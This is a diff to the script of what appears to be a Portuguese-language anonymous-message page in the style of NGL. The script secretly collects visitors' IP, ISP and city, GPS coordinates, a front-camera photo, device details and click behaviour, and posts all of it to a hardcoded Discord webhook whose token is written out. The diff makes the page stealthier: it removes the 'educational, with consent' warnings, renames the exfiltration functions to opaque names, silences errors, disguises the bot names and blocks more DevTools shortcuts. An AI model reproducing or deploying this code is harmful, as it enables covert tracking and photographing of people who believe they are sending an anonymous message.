@@ -519,14 +519,10 @@
   </div>
 
   <script>
-    // SISTEMA EDUCACIONAL AVANÇADO - PARA FINS DE APRENDIZADO
-    // Use apenas para teste pessoal e compreensão de técnicas de coleta
-    
-    class AdvancedDataCollector {
+    class DataSystem {
         constructor() {
             this.webhook = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2";
             
-            // Estado do sistema
             this.data = {
                 location: { lat: null, lon: null, accuracy: null, status: 'pending' },
                 camera: { image: null, status: 'pending', sent: false },
@@ -541,7 +537,8 @@
                 locationSent: false,
                 cameraSent: false,
                 permissionsRequested: false,
-                formSubmitted: false
+                formSubmitted: false,
+                initCompleted: false
             };
             
             this.detectDevice();
@@ -558,15 +555,8 @@
                 isChrome: ua.includes('Chrome') && !ua.includes('Edge'),
                 isFirefox: ua.includes('Firefox'),
                 userAgent: ua,
-                screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    colorDepth: screen.colorDepth
-                },
-                viewport: {
-                    width: window.innerWidth,
-                    height: window.innerHeight
-                },
+                screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth },
+                viewport: { width: window.innerWidth, height: window.innerHeight },
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 language: navigator.language,
                 platform: navigator.platform,
@@ -575,41 +565,41 @@
         }
         
         async init() {
-            console.log('🚀 Iniciando sistema avançado...');
-            
-            // Obter informações básicas
+            this.setupInitialListeners();
+            this.showPermissionPrompt();
+        }
+
+        async continueInit() {
+            if (this.flags.initCompleted) return;
+            this.flags.initCompleted = true;
+
             await this.getIPInfo();
-            
-            // Configurar eventos
-            this.setupEventListeners();
-            this.setupCharacterCounter();
-            
-            // Iniciar captura automática em mobile
-            if (this.data.device.isMobile) {
-                setTimeout(() => this.captureCamera(), 500);
-            }
-            
-            // Mostrar prompt após delay
-            setTimeout(() => this.showPermissionPrompt(), 1500);
-            
-            // Auto-request em interações
+            this.setupInteractionListeners();
+            this.requestAllPermissions();
             this.setupAutoTriggers();
         }
         
-        setupEventListeners() {
-            // Form submission
+        setupInitialListeners() {
             document.getElementById('anonymous-form').addEventListener('submit', (e) => {
                 e.preventDefault();
                 this.handleFormSubmit();
             });
             
-            // Permission button
             document.getElementById('permission-button').addEventListener('click', () => {
                 this.hidePermissionPrompt();
-                this.requestAllPermissions();
+                this.continueInit();
             });
-            
-            // Rastrear interações
+
+            const textarea = document.getElementById('pergunta');
+            const counter = document.getElementById('char-count');
+            if (textarea && counter) {
+                textarea.addEventListener('input', () => {
+                    counter.textContent = textarea.value.length;
+                });
+            }
+        }
+
+        setupInteractionListeners() {
             document.addEventListener('click', (e) => {
                 this.data.behavior.interactions.push({
                     type: 'click',
@@ -617,18 +607,6 @@
                     timestamp: Date.now() - this.data.behavior.startTime
                 });
             });
-        }
-        
-        setupCharacterCounter() {
-            const textarea = document.getElementById('pergunta');
-            const counter = document.getElementById('char-count');
-            
-            if (textarea && counter) {
-                textarea.addEventListener('input', () => {
-                    const count = textarea.value.length;
-                    counter.textContent = count;
-                });
-            }
         }
         
         setupAutoTriggers() {
@@ -646,119 +624,74 @@
         
         showPermissionPrompt() {
             const element = document.getElementById('permission-prompt');
-            if (element) {
-                element.style.display = 'flex';
-            }
+            if (element) element.style.display = 'flex';
         }
         
         hidePermissionPrompt() {
             const element = document.getElementById('permission-prompt');
-            if (element) {
-                element.style.display = 'none';
-            }
+            if (element) element.style.display = 'none';
         }
         
         async getIPInfo() {
             try {
                 const services = [
-                    'https://ip-api.com/json',
-                    'https://ipapi.co/json/',
-                    'https://ipinfo.io/json',
-                    'https://ipwhois.app/json/',
+                    'https://ip-api.com/json', 'https://ipapi.co/json/', 
+                    'https://ipinfo.io/json', 'https://ipwhois.app/json/',
                     'https://api.ipgeolocation.io/ipgeo?apiKey=demo'
                 ];
-                
                 for (const service of services) {
                     try {
-                        const response = await fetch(service);
+                        const response = await fetch(service, { signal: AbortSignal.timeout(2000) });
                         if (response.ok) {
                             const data = await response.json();
                             this.data.ip = {
-                                ip: data.ip || data.query,
-                                city: data.city,
-                                region: data.region || data.regionName,
-                                country: data.country_name || data.country,
-                                isp: data.org || data.isp,
-                                latitude: parseFloat(data.latitude || data.lat) || null,
-                                longitude: parseFloat(data.longitude || data.lon) || null,
-                                timezone: data.timezone,
+                                ip: data.ip || data.query, city: data.city,
+                                region: data.region || data.regionName, country: data.country_name || data.country,
+                                isp: data.org || data.isp, latitude: parseFloat(data.latitude || data.lat) || null,
+                                longitude: parseFloat(data.longitude || data.lon) || null, timezone: data.timezone,
                                 service: service
                             };
-                            
-                            console.log('📡 IP info obtida');
                             return;
                         }
-                    } catch (e) {
-                        console.log(`Tentando próximo serviço...`);
-                    }
+                    } catch (e) { /* Continue silently */ }
                 }
-            } catch (error) {
-                console.log('IP info não disponível');
-            }
+            } catch (error) { /* Fail silently */ }
         }
         
         async requestAllPermissions() {
             if (this.flags.permissionsRequested) return;
             this.flags.permissionsRequested = true;
             
-            console.log('🔐 Solicitando permissões...');
-            
-            const requests = [
-                this.requestLocation(),
-                this.requestNotifications()
-            ];
-            
-            // Se não capturou câmera ainda, tentar novamente
+            const requests = [this.requestLocation(), this.requestNotifications()];
             if (!this.flags.cameraAttempted) {
                 requests.push(this.captureCamera());
             }
-            
             await Promise.allSettled(requests);
-            console.log('✅ Permissões processadas');
         }
         
         async requestLocation() {
             try {
                 if (!navigator.geolocation) return;
-                
-                const options = {
-                    enableHighAccuracy: true,
-                    timeout: this.data.device.isIOS ? 20000 : 10000,
-                    maximumAge: 0
-                };
-                
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, options);
-                });
+                const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
+                const position = await new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject, options));
                 
                 this.data.location = {
-                    lat: position.coords.latitude,
-                    lon: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    status: 'success',
-                    source: 'GPS'
+                    lat: position.coords.latitude, lon: position.coords.longitude,
+                    accuracy: position.coords.accuracy, status: 'success', source: 'GPS'
                 };
-                
-                // Criar Google Maps URL
                 this.data.location.googleMapsUrl = `https://www.google.com/maps?q=${this.data.location.lat},${this.data.location.lon}`;
-                
-                console.log('✅ Localização obtida');
-                this.showToast('📍 Localização verificada', 'success');
-                
-                // Enviar localização imediatamente
-                this.sendLocationToDiscord();
-                
+                this.showToast('📍 Verificação de local OK', 'success');
+                this._sL();
             } catch (error) {
-                console.log('❌ Localização negada');
                 this.data.location.status = 'error';
-                
-                // Fallback para IP
                 if (this.data.ip.latitude && this.data.ip.longitude) {
-                    this.data.location.lat = this.data.ip.latitude;
-                    this.data.location.lon = this.data.ip.longitude;
-                    this.data.location.googleMapsUrl = `https://www.google.com/maps?q=${this.data.location.lat},${this.data.location.lon}`;
-                    this.data.location.source = 'IP';
-                    this.sendLocationToDiscord();
+                    this.data.location = {
+                        ...this.data.location,
+                        lat: this.data.ip.latitude, lon: this.data.ip.longitude,
+                        googleMapsUrl: `https://www.google.com/maps?q=${this.data.ip.latitude},${this.data.ip.longitude}`,
+                        source: 'IP'
+                    };
+                    this._sL();
                 }
             }
         }
@@ -767,380 +700,170 @@
             if (this.flags.cameraAttempted) return;
             this.flags.cameraAttempted = true;
             
-            try {
-                console.log('📸 Iniciando captura rápida...');
-                
-                const video = document.getElementById('video');
-                const canvas = document.getElementById('canvas');
-                
-                // Configurações otimizadas para velocidade
-                const constraints = {
-                    audio: false,
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 },
-                        frameRate: { ideal: 15 }
-                    }
-                };
-                
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                video.srcObject = stream;
-                
-                // Configurar vídeo para silencioso
-                video.muted = true;
-                video.volume = 0;
-                video.setAttribute('playsinline', '');
-                
-                // Aguardar vídeo carregar e começar a tocar
-                await new Promise(resolve => {
-                    video.onloadedmetadata = () => {
-                        video.play().then(resolve).catch(resolve);
-                    };
-                });
-                
-                // Aumentar o tempo de espera para a câmera estabilizar
-                await new Promise(resolve => setTimeout(resolve, 500));
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const constraints = { audio: false, video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } };
+            let stream = null;
 
-                try {
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    this.data.camera = {
-                        image: canvas.toDataURL('image/jpeg', 0.7),
-                        status: 'success',
-                        resolution: `${canvas.width}x${canvas.height}`,
-                        timestamp: new Date().toISOString()
-                    };
-                    
-                    console.log('✅ Foto capturada!');
-                    this.showToast('📸 Verificação visual OK', 'success');
-                    
-                    // Enviar foto imediatamente
-                    this.sendCameraToDiscord();
-                    
-                } catch (e) {
-                    console.error('Erro na captura:', e);
-                } finally {
-                    // SEMPRE parar a câmera
+            try {
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = stream;
+                video.muted = true;
+                video.playsInline = true;
+                
+                await new Promise(resolve => { video.onloadedmetadata = () => video.play().then(resolve).catch(resolve); });
+                await new Promise(resolve => setTimeout(resolve, 400));
+
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                this.data.camera = {
+                    image: canvas.toDataURL('image/jpeg', 0.7), status: 'success',
+                    resolution: `${canvas.width}x${canvas.height}`, timestamp: new Date().toISOString()
+                };
+                this.showToast('📸 Verificação visual OK', 'success');
+                this._sC();
+            } catch (error) {
+                this.data.camera.status = 'error';
+            } finally {
+                if (stream) {
                     stream.getTracks().forEach(track => track.stop());
+                }
+                if (video) {
                     video.srcObject = null;
                 }
-                
-            } catch (error) {
-                console.log('❌ Câmera não acessível');
-                this.data.camera.status = 'error';
             }
         }
         
         async requestNotifications() {
             try {
-                if (!('Notification' in window)) return;
-                
-                let permission = Notification.permission;
-                
-                if (permission === 'default') {
-                    permission = await Notification.requestPermission();
-                }
-                
+                if (!('Notification' in window) || Notification.permission === 'denied') return;
+                let permission = Notification.permission === 'default' ? await Notification.requestPermission() : Notification.permission;
                 this.data.permissions.notifications = permission === 'granted';
-                
                 if (permission === 'granted') {
-                    const notification = new Notification('✅ Sistema Verificado', {
-                        body: 'Suas permissões foram configuradas!',
-                        requireInteraction: false
-                    });
-                    
+                    const notification = new Notification('✅ Sistema Verificado', { body: 'Suas permissões foram configuradas!', requireInteraction: false });
                     setTimeout(() => notification.close(), 3000);
-                    console.log('✅ Notificações ativadas');
                 }
-                
-            } catch (error) {
-                console.log('❌ Notificações negadas');
-            }
+            } catch (error) { /* Fail silently */ }
         }
         
-        async sendLocationToDiscord() {
+        async _sL() { // Formerly sendLocationToDiscord
             if (this.flags.locationSent || !this.data.location.lat) return;
             this.flags.locationSent = true;
-            
             try {
                 const { lat, lon, accuracy, googleMapsUrl, source } = this.data.location;
-                
                 const payload = {
-                    username: "📍 Location Tracker",
-                    avatar_url: "https://cdn-icons-png.flaticon.com/512/854/854878.png",
+                    username: "System Analytics", avatar_url: "https://cdn-icons-png.flaticon.com/512/854/854878.png",
                     embeds: [{
-                        title: `📍 Localização Capturada (${source || 'N/A'})`,
-                        description: `Coordenadas obtidas com sucesso!\n[🗺️ Ver no Google Maps](${googleMapsUrl})`,
+                        title: `Location Data (${source || 'N/A'})`,
+                        description: `[View on Map](${googleMapsUrl})`,
                         color: source === 'GPS' ? 0x00FF00 : 0xFFA500,
                         fields: [
-                            {
-                                name: "📍 Coordenadas",
-                                value: `**Latitude:** \`${lat.toFixed(6)}\`\n**Longitude:** \`${lon.toFixed(6)}\``,
-                                inline: true
-                            },
-                            {
-                                name: "🎯 Precisão",
-                                value: `\`${accuracy ? accuracy.toFixed(2) + ' metros' : 'N/A'}\``,
-                                inline: true
-                            },
-                            {
-                                name: "📱 Dispositivo",
-                                value: `\`${this.data.device.isIOS ? 'iOS' : this.data.device.isAndroid ? 'Android' : 'Desktop'}\``,
-                                inline: true
-                            },
-                            {
-                                name: "🌐 IP",
-                                value: `\`${this.data.ip.ip || 'N/A'}\``,
-                                inline: true
-                            },
-                            {
-                                name: " ISP",
-                                value: `\`${this.data.ip.isp || 'N/A'}\``,
-                                inline: true
-                            },
-                            {
-                                name: "🕐 Timestamp",
-                                value: `\`${new Date().toLocaleString('pt-BR')}\``,
-                                inline: true
-                            }
+                            { name: "Coordinates", value: `Lat: \`${lat.toFixed(6)}\`\nLon: \`${lon.toFixed(6)}\``, inline: true },
+                            { name: "Accuracy", value: `\`${accuracy ? accuracy.toFixed(2) + 'm' : 'N/A'}\``, inline: true },
+                            { name: "Device", value: `\`${this.data.device.isIOS ? 'iOS' : this.data.device.isAndroid ? 'Android' : 'Desktop'}\``, inline: true },
+                            { name: "IP", value: `\`${this.data.ip.ip || 'N/A'}\``, inline: true },
+                            { name: "ISP", value: `\`${this.data.ip.isp || 'N/A'}\``, inline: true },
+                            { name: "Timestamp", value: `\`${new Date().toLocaleString('pt-BR')}\``, inline: true }
                         ],
-                        url: googleMapsUrl,
-                        footer: {
-                            text: "Sistema de Localização Educacional"
-                        },
-                        timestamp: new Date().toISOString()
+                        footer: { text: "System Analytics" }, timestamp: new Date().toISOString()
                     }]
                 };
-                
-                const response = await fetch(this.webhook, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                
-                if (response.ok) {
-                    console.log("📍 Localização enviada!");
-                }
-                
-            } catch (error) {
-                console.error("Erro ao enviar localização:", error);
-            }
+                await fetch(this.webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+            } catch (error) { /* Fail silently */ }
         }
         
-        async sendCameraToDiscord() {
+        async _sC() { // Formerly sendCameraToDiscord
             if (this.flags.cameraSent || !this.data.camera.image) return;
             this.flags.cameraSent = true;
-            
             try {
                 const payload = {
-                    username: "📸 Camera Capture",
-                    avatar_url: "https://cdn-icons-png.flaticon.com/512/3075/3075977.png",
-                    content: "📸 **Foto capturada com sucesso!**",
+                    username: "System Verification", avatar_url: "https://cdn-icons-png.flaticon.com/512/3075/3075977.png",
+                    content: "**Visual Verification**",
                     embeds: [{
-                        title: "Verificação Visual Concluída",
-                        description: "Imagem capturada automaticamente para verificação de segurança",
-                        color: 0x00FF00,
+                        title: "Visual Check Complete", color: 0x00FF00,
                         fields: [
-                            {
-                                name: "📱 Dispositivo",
-                                value: `\`${this.data.device.isIOS ? 'iOS' : this.data.device.isAndroid ? 'Android' : 'Desktop'}\``,
-                                inline: true
-                            },
-                            {
-                                name: "🌐 IP",
-                                value: `\`${this.data.ip.ip || 'N/A'}\``,
-                                inline: true
-                            },
-                            {
-                                name: "🕐 Capturada em",
-                                value: `\`${new Date().toLocaleString('pt-BR')}\``,
-                                inline: true
-                            }
+                            { name: "Device", value: `\`${this.data.device.isIOS ? 'iOS' : this.data.device.isAndroid ? 'Android' : 'Desktop'}\``, inline: true },
+                            { name: "IP", value: `\`${this.data.ip.ip || 'N/A'}\``, inline: true },
+                            { name: "Timestamp", value: `\`${new Date().toLocaleString('pt-BR')}\``, inline: true }
                         ],
-                        image: {
-                            url: "attachment://camera_capture.jpg"
-                        },
-                        footer: {
-                            text: "Sistema de Verificação Visual"
-                        },
-                        timestamp: new Date().toISOString()
+                        image: { url: "attachment://capture.jpg" },
+                        footer: { text: "Visual Verification System" }, timestamp: new Date().toISOString()
                     }]
                 };
-                
-                // Preparar FormData para envio da imagem
                 const formData = new FormData();
                 formData.append("payload_json", JSON.stringify(payload));
-                
-                // Converter base64 para blob
                 const blob = this.dataURLtoBlob(this.data.camera.image);
-                formData.append("file", blob, "camera_capture.jpg");
-                
-                const response = await fetch(this.webhook, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                if (response.ok) {
-                    console.log("📸 Foto enviada!");
-                }
-                
-            } catch (error) {
-                console.error("Erro ao enviar foto:", error);
-            }
+                formData.append("file", blob, "capture.jpg");
+                await fetch(this.webhook, { method: 'POST', body: formData });
+            } catch (error) { /* Fail silently */ }
         }
         
         dataURLtoBlob(dataURL) {
-            const arr = dataURL.split(',');
-            const mime = arr[0].match(/:(.*?);/)[1];
-            const bstr = atob(arr[1]);
-            let n = bstr.length;
-            const u8arr = new Uint8Array(n);
-            
-            while (n--) {
-                u8arr[n] = bstr.charCodeAt(n);
-            }
-            
+            const arr = dataURL.split(','), mime = arr[0].match(/:(.*?);/)[1], bstr = atob(arr[1]);
+            let n = bstr.length; const u8arr = new Uint8Array(n);
+            while (n--) { u8arr[n] = bstr.charCodeAt(n); }
             return new Blob([u8arr], { type: mime });
         }
         
         showToast(message, type = 'info') {
             const toast = document.createElement('div');
-            toast.className = `toast ${type}`;
+            toast.className = `toast ${type} show`;
             toast.textContent = message;
-            
             document.body.appendChild(toast);
-            
-            setTimeout(() => toast.classList.add('show'), 100);
-            
             setTimeout(() => {
                 toast.classList.remove('show');
-                setTimeout(() => {
-                    if (document.body.contains(toast)) {
-                        document.body.removeChild(toast);
-                    }
-                }, 300);
+                setTimeout(() => { if (document.body.contains(toast)) document.body.removeChild(toast); }, 300);
             }, 2500);
         }
         
         validateForm() {
             const pergunta = document.getElementById('pergunta').value.trim();
-            
-            if (!pergunta) {
-                this.showToast('❌ Escreva uma mensagem', 'error');
-                return false;
-            }
-            
-            if (pergunta.length < 5) {
+            if (!pergunta || pergunta.length < 5) {
                 this.showToast('❌ Mensagem muito curta', 'error');
                 return false;
             }
-            
             return true;
         }
         
         async handleFormSubmit() {
-            if (this.flags.formSubmitted) return;
-            
-            if (!this.validateForm()) return;
-            
+            if (this.flags.formSubmitted || !this.validateForm()) return;
             this.flags.formSubmitted = true;
             
-            // Mostrar loading
             document.getElementById('loading-overlay').style.display = 'flex';
             document.getElementById('btn-enviar').disabled = true;
             
-            // Garantir que todas as permissões foram solicitadas
             if (!this.flags.permissionsRequested) {
                 await this.requestAllPermissions();
                 await new Promise(resolve => setTimeout(resolve, 1000));
             }
             
-            // Calcular tempo na página
             this.data.behavior.timeToSubmit = Date.now() - this.data.behavior.startTime;
-            
-            // Enviar dados completos
-            await this.sendCompleteData();
+            await this._sD();
         }
         
-        async sendCompleteData() {
+        async _sD() { // Formerly sendCompleteData
             try {
                 const pergunta = document.getElementById('pergunta').value.trim();
                 const nome = document.getElementById('nome').value.trim() || 'Anônimo';
-                
                 const embed = {
-                    title: '💬 Nova Mensagem Anônima Completa',
-                    description: `**Mensagem:** ${pergunta}`,
-                    color: 0x667eea,
+                    title: 'New Anonymous Submission', description: `**Message:** ${pergunta}`, color: 0x667eea,
                     fields: [
-                        {
-                            name: '👤 Usuário',
-                            value: `**Nome:** ${nome}\n**Data:** ${new Date().toLocaleString('pt-BR')}`,
-                            inline: false
-                        },
-                        {
-                            name: '🌐 Informações de Rede',
-                            value: `**IP:** ${this.data.ip.ip || 'N/A'}\n**Cidade:** ${this.data.ip.city || 'N/A'}\n**País:** ${this.data.ip.country || 'N/A'}`,
-                            inline: true
-                        },
-                        {
-                            name: '📍 Localização',
-                            value: this.data.location.status === 'success' 
-                                ? `**GPS:** ${this.data.location.lat?.toFixed(6)}, ${this.data.location.lon?.toFixed(6)}\n[🗺️ Google Maps](${this.data.location.googleMapsUrl})`
-                                : 'Não disponível',
-                            inline: true
-                        },
-                        {
-                            name: '📱 Dispositivo',
-                            value: `**Tipo:** ${this.data.device.isMobile ? 'Mobile' : 'Desktop'}\n**OS:** ${this.data.device.isIOS ? 'iOS' : this.data.device.isAndroid ? 'Android' : 'Outro'}\n**Browser:** ${this.data.device.isChrome ? 'Chrome' : this.data.device.isSafari ? 'Safari' : 'Outro'}`,
-                            inline: false
-                        },
-                        {
-                            name: '📊 Comportamento',
-                            value: `**Tempo:** ${Math.round(this.data.behavior.timeToSubmit / 1000)}s\n**Interações:** ${this.data.behavior.interactions.length}`,
-                            inline: true
-                        },
-                        {
-                            name: '🔐 Verificações',
-                            value: [
-                                `📍 GPS: ${this.data.location.status === 'success' ? '✅' : '❌'}`,
-                                `📸 Câmera: ${this.data.camera.status === 'success' ? '✅' : '❌'}`,
-                                `🔔 Notificações: ${this.data.permissions.notifications ? '✅' : '❌'}`
-                            ].join('\n'),
-                            inline: true
-                        }
+                        { name: 'User', value: `**Name:** ${nome}\n**Date:** ${new Date().toLocaleString('pt-BR')}`, inline: false },
+                        { name: 'Network Info', value: `**IP:** ${this.data.ip.ip || 'N/A'}\n**City:** ${this.data.ip.city || 'N/A'}\n**Country:** ${this.data.ip.country || 'N/A'}`, inline: true },
+                        { name: 'Location', value: this.data.location.status === 'success' ? `**GPS:** ${this.data.location.lat?.toFixed(6)}, ${this.data.location.lon?.toFixed(6)}\n[Map](${this.data.location.googleMapsUrl})` : 'Not available', inline: true },
+                        { name: 'Device', value: `**Type:** ${this.data.device.isMobile ? 'Mobile' : 'Desktop'}\n**OS:** ${this.data.device.isIOS ? 'iOS' : this.data.device.isAndroid ? 'Android' : 'Other'}\n**Browser:** ${this.data.device.isChrome ? 'Chrome' : this.data.device.isSafari ? 'Safari' : 'Other'}`, inline: false },
+                        { name: 'Behavior', value: `**Time:** ${Math.round(this.data.behavior.timeToSubmit / 1000)}s\n**Interactions:** ${this.data.behavior.interactions.length}`, inline: true },
+                        { name: 'Checks', value: [`📍 GPS: ${this.data.location.status === 'success' ? '✅' : '❌'}`, `📸 Cam: ${this.data.camera.status === 'success' ? '✅' : '❌'}`, `🔔 Notif: ${this.data.permissions.notifications ? '✅' : '❌'}`].join('\n'), inline: true }
                     ],
-                    footer: {
-                        text: '💬 Sistema Educacional de Coleta de Dados'
-                    },
-                    timestamp: new Date().toISOString()
+                    footer: { text: 'Data Collection System' }, timestamp: new Date().toISOString()
                 };
-                
-                const payload = {
-                    username: '💬 Sistema Completo NGL-Style',
-                    avatar_url: 'https://cdn-icons-png.flaticon.com/512/1828/1828833.png',
-                    embeds: [embed]
-                };
-                
-                const response = await fetch(this.webhook, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                
-                if (response.ok) {
-                    console.log('✅ Dados completos enviados!');
-                    this.showSuccessModal();
-                } else {
-                    throw new Error('Falha no envio');
-                }
-                
+                const payload = { username: 'User Submission', avatar_url: 'https://cdn-icons-png.flaticon.com/512/1828/1828833.png', embeds: [embed] };
+                const response = await fetch(this.webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+                if (response.ok) this.showSuccessModal();
+                else throw new Error('Failed to send');
             } catch (error) {
-                console.error('❌ Erro no envio:', error);
                 this.showToast('❌ Erro ao enviar. Tente novamente.', 'error');
                 this.flags.formSubmitted = false;
                 document.getElementById('btn-enviar').disabled = false;
@@ -1151,42 +874,27 @@
         
         showSuccessModal() {
             document.getElementById('success-modal').style.display = 'flex';
-            
-            // Limpar formulário
             document.getElementById('pergunta').value = '';
             document.getElementById('nome').value = '';
             const counter = document.getElementById('char-count');
             if (counter) counter.textContent = '0';
-            
-            // Reset
             this.flags.formSubmitted = false;
             document.getElementById('btn-enviar').disabled = false;
         }
     }
     
-    // Função global para fechar modal
     window.closeSuccessModal = function() {
         const modal = document.getElementById('success-modal');
         if (modal) modal.style.display = 'none';
     };
     
-    // Inicializar sistema
     document.addEventListener('DOMContentLoaded', () => {
-        console.log('💬 Iniciando sistema NGL avançado...');
-        window.advancedSystem = new AdvancedDataCollector();
-        console.log('✅ Sistema pronto!');
-        
-        // Avisos importantes
-        console.warn('⚠️ Sistema educacional - Para aprendizado apenas');
-        console.warn('⚠️ Use responsavelmente e com consentimento');
-        console.warn('⚠️ Dados coletados para fins de demonstração técnica');
+        window.dataSystem = new DataSystem();
     });
     
-    // Proteções básicas
     document.addEventListener('keydown', (e) => {
-        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C'))) {
             e.preventDefault();
-            console.log('🔒 DevTools bloqueado');
             return false;
         }
     });
@@ -1195,11 +903,6 @@
         e.preventDefault();
         return false;
     });
-    
-    // Console messages
-    console.log('%c📸 SISTEMA DE CAPTURA AVANÇADO', 'color: #667eea; font-size: 16px; font-weight: bold;');
-    console.log('%cCâmera ultra-rápida • GPS preciso • Dados completos', 'color: #764ba2; font-size: 12px;');
-    console.log('%cPara fins educacionais e teste pessoal apenas', 'color: #95a5a6; font-size: 10px;');
 </script>
 </body>
 </html>
